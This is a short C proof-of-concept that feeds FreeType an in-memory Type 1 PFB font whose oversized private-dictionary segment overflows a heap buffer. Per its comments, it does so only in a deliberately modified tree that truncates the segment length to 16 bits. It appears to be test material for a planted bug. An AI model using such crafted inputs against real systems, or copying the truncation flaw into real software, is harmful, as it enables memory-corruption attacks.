/* Proof-of-concept for a heap-buffer-overflow in the Type 1 (PFB) loader.
 *
 * Drives only FreeType's public API (FT_Init_FreeType / FT_New_Memory_Face)
 * with an in-contract, in-memory PFB font.  On the modified tree the private
 * dictionary buffer is sized from a 16-bit truncation of the segment length
 * while the full 32-bit length is read into it, overflowing the heap buffer
 * for any 0x8002 segment larger than 0xFFFF bytes.  AddressSanitizer aborts
 * on that write.  The same input loads without error on the unmodified tree.
 *
 * Build (ASan), e.g.:
 *   cc -fsanitize=address -I<ft>/include probe.c -o probe <freetype.a> ...
 */

#include <ft2build.h>
#include FT_FREETYPE_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* store a 32-bit little-endian value (PFB segment length field) */
static void
put_le32( unsigned char*  p,
          unsigned long   v )
{
  p[0] = (unsigned char)( v         & 0xff );
  p[1] = (unsigned char)( ( v >>  8 ) & 0xff );
  p[2] = (unsigned char)( ( v >> 16 ) & 0xff );
  p[3] = (unsigned char)( ( v >> 24 ) & 0xff );
}

int
main( void )
{
  /* A minimal but well-formed PFB font:
   *   - segment 0x8001 (ASCII): the base dictionary, starting with the
   *     Type 1 magic so the font is recognized and the top dictionary
   *     parses cleanly;
   *   - segment 0x8002 (binary): the private dictionary, declared with a
   *     length greater than 0xFFFF and actually present in the stream, so
   *     the in-contract read succeeds;
   *   - segment 0x8003: end of file.
   */
  const char*    base    = "%!FontType1-1.0\n/Private 0 dict dup begin\n";
  unsigned long  baselen = (unsigned long)strlen( base );
  unsigned long  privlen = 70000;   /* > 0xFFFF triggers the truncation */

  unsigned long  total = 6 + baselen + 6 + privlen + 2;
  unsigned char* buf   = (unsigned char*)calloc( 1, total );
  unsigned long  o     = 0;

  FT_Library  lib;
  FT_Face     face;
  FT_Error    err;

  if ( !buf )
    return 2;

  /* 0x8001 base dictionary segment */
  buf[o++] = 0x80;
  buf[o++] = 0x01;
  put_le32( buf + o, baselen );
  o += 4;
  memcpy( buf + o, base, baselen );
  o += baselen;

  /* 0x8002 binary private dictionary segment (oversized length) */
  buf[o++] = 0x80;
  buf[o++] = 0x02;
  put_le32( buf + o, privlen );
  o += 4;
  memset( buf + o, 0x20, privlen );
  o += privlen;

  /* 0x8003 EOF segment */
  buf[o++] = 0x80;
  buf[o++] = 0x03;

  if ( FT_Init_FreeType( &lib ) )
  {
    free( buf );
    return 2;
  }

  err = FT_New_Memory_Face( lib, buf, (FT_Long)total, 0, &face );
  printf( "FT_New_Memory_Face err=%d total=%lu\n", err, total );

  if ( !err )
    FT_Done_Face( face );

  FT_Done_FreeType( lib );
  free( buf );
  return 0;
}
